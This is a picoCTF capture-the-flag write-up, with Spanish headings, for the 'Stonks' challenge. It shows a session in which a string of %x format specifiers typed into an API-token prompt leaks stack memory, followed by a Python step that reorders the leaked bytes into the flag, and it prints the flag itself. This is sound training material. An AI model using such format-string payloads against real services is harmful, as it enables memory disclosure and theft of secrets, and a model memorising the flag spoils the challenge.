
 
#### Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`

## Pistas

Okay, maybe I'd believe you if you find my API key.


## Solución

``` 

hannlec117-picoctf@webshell:~$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
85f5330804b00080489c3f7efcd80ffffffff185f3160f7f0a110f7efcdc7085f4180185f531085f53306f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ff94007df7f37af8f7f0a4407c62150010f7d99ce9f7f0b0c0f7efc5c0f7efc000ff9424f8f7d8a68df7efc5c0
Portfolio as of Mon May 15 22:36:40 UTC 2023


1 shares of R
5 shares of PXUP
Goodbye!

hannlec117-picoctf@webshell:~$ python
Python 3.10.6 (main, Aug 10 2022, 11:40:04) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s 
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 's' is not defined
>>> s = 'ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿ}'
>>> for x in range(0,len(s),4):
...     print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
... 
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
IndexError: string index out of range
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6>>> 
```

## Bandera
Flag: picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}


## Notas adicionales


## Referencias
